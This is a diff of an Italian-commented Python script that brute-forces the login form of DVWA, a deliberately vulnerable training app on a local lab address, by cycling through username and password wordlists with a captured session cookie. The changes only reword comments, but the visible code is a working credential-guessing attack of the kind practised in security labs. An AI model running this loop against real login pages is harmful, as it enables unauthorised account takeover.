@@ -12,7 +12,7 @@ def bruteforce(level):
         "Login": "Login"
     }
 
-    # Esegui la richiesta di login per ottenere il PHPSESSID
+    # Esecuzione della richiesta di login per ottenere il PHPSESSID
     login_response = requests.post(login_url, data=login_payload)
 
     # Verifica che il login sia andato a buon fine
@@ -20,16 +20,16 @@ def bruteforce(level):
         print("Errore durante il login. Potrebbe essere necessario fornire credenziali valide.")
         exit()
 
-    # Estrai il PHPSESSID dal cookie della risposta di login
+    # Estrazione del PHPSESSID dal cookie
     phpsessid_cookie = login_response.request.headers.get('Cookie').split('; ')[1].split('=')[1]
 
-    # Stampa il PHPSESSID a schermo
+    # Stampa del PHPSESSID a schermo
     print(f"PHPSESSID ottenuto con successo: {phpsessid_cookie}")
 
-    # Costruisci l'header con il PHPSESSID
+    # Costruzione dell'header 
     header = {"Cookie": f"security={level}; PHPSESSID={phpsessid_cookie}"}
 
-    # Leggi i nomi utente e le password dai file
+    # lettura dei nomi utente e password dalle liste
     usernames_file_path = "/home/kali/Desktop/usernames.lst"
     passwords_file_path = "/home/kali/Desktop/passwords.lst"
 
@@ -37,7 +37,7 @@ def bruteforce(level):
         usernames = usernames_file.readlines()
         passwords = passwords_file.readlines()
 
-    # Itera sui nomi utente e password
+    # Iterazione di nomi utente e password
     for user in usernames:
         for password in passwords:
             url = "http://192.168.1.102/dvwa/vulnerabilities/brute/"
@@ -47,7 +47,7 @@ def bruteforce(level):
             
             print(f"\n[?]provando username: {users} - password: {passw}")
             
-            # Stampa il PHPSESSID prima di eseguire la richiesta successiva
+            # Stampa del PHPSESSID prima di eseguire la richiesta successiva
             print(f" SID della richiesta: {phpsessid_cookie}")
 
             r = requests.get(url, params=get_data, headers=header)
@@ -56,6 +56,7 @@ def bruteforce(level):
                 exit()
                 
 if __name__ == "__main__":
+    #scelta della sicurezza di DVWA, con ciclo while per la gestione degli errori
     while True:
         level=input("\n//-----BRUTEFORCE DVWA-----//\nScegli il livello di sicurezza\n1. low\n2. medium\n3. high\nscelta: ")
         level=level.lower()
